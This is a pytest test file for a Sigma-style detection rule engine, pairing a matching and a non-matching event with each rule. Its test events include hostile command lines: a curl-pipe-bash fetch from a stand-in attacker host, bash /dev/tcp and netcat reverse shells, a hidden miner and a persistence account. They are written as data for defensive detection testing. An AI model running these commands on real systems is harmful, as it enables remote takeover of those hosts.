"""One positive and one negative event for every shipped rule."""

import pytest

import main as sigma

RULES = {rule["id"]: rule for rule in sigma.load_rules(sigma.DEFAULT_RULES_DIR)}


def event(kind, **sections):
    return {"event": {"time": "2026-01-28T12:00:00Z", "source": "test", "kind": kind}, "host": {"name": "prod-server"}, **sections}


def proc(command_line, name="bash"):
    return event("process_start", process={"name": name, "pid": 4242, "command_line": command_line})


CASES = [
    # rule id, event, should match
    ("auth-001", event("authentication_failure", user={"name": "root"}), True),
    ("auth-001", event("authentication_success", user={"name": "root"}), False),
    ("auth-002", event("authentication_success", user={"name": "root"}, process={"name": "sshd"}), True),
    ("auth-002", event("authentication_success", user={"name": "alice"}, process={"name": "sshd"}), False),
    ("auth-002", event("authentication_failure", user={"name": "root"}, process={"name": "sshd"}), False),
    ("privesc-001", event("privilege_escalation", process={"name": "sudo", "command_line": "alice : TTY=pts/0 ; USER=root ; COMMAND=/bin/bash"}), True),
    ("privesc-001", event("privilege_escalation", process={"name": "sudo", "command_line": "alice : TTY=pts/0 ; USER=root ; COMMAND=/usr/bin/apt update"}), False),
    ("exec-001", proc("sh -c curl -fsSL http://evil-login.example.net/i.sh | bash"), True),
    ("exec-001", proc("curl -fsSL https://example.com/file.tar.gz -o file.tar.gz", name="curl"), False),
    ("exec-002", proc("bash -c bash -i >& /dev/tcp/198.51.100.42/4444 0>&1"), True),
    ("exec-002", proc("nc -e /bin/sh 198.51.100.42 4444", name="nc"), True),
    ("exec-002", proc("nc -zv db-01 5432", name="nc"), False),
    ("exec-003", proc("/tmp/.x/miner --threads 8", name="miner"), True),
    ("exec-003", proc("/usr/bin/ls /tmp/", name="ls"), False),
    ("persist-001", proc("useradd -m -s /bin/bash svc-backup", name="useradd"), True),
    ("persist-001", proc("usermod -aG sudo alice", name="usermod"), False),
    ("net-001", event("network_connection", process={"name": "bash"}, network={"dst_ip": "198.51.100.42", "dst_port": 4444, "protocol": "tcp"}), True),
    ("net-001", event("network_connection", process={"name": "curl"}, network={"dst_ip": "93.184.216.34", "dst_port": 443, "protocol": "tcp"}), False),
]


def test_every_rule_has_a_positive_and_negative_case():
    for rule_id in RULES:
        outcomes = {expected for rid, _, expected in CASES if rid == rule_id}
        assert outcomes == {True, False}, f"{rule_id} needs a matching and a non-matching test case"


@pytest.mark.parametrize("rule_id,ev,expected", CASES, ids=[f"{c[0]}-{'hit' if c[2] else 'miss'}-{i}" for i, c in enumerate(CASES)])
def test_rule(rule_id, ev, expected):
    assert sigma.check_rule(ev, RULES[rule_id]) is expected
